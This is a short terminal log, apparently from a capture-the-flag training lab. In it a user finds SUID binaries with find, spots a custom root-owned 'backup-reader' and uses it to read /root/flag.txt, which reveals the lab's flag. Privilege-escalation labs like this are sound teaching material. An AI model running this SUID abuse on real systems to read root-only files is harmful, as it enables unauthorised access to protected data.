@@ -1,0 +1,15 @@
+student@lab:~$ find / -perm -4000 -type f 2>/dev/null
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/local/bin/backup-reader
+/usr/bin/find
+student@lab:~$ ls -l /usr/local/bin/backup-reader
+-rwsr-xr-x 1 root root 14728 Nov 10 18:02 /usr/local/bin/backup-reader
+student@lab:~$ /usr/local/bin/backup-reader --help
+usage: backup-reader [FILE]   (runs with euid=0)
+student@lab:~$ ls -l /root
+ls: cannot open directory '/root': Permission denied
+student@lab:~$ /usr/local/bin/backup-reader /root/flag.txt
+SNT{f1nd_p3rm_4000}
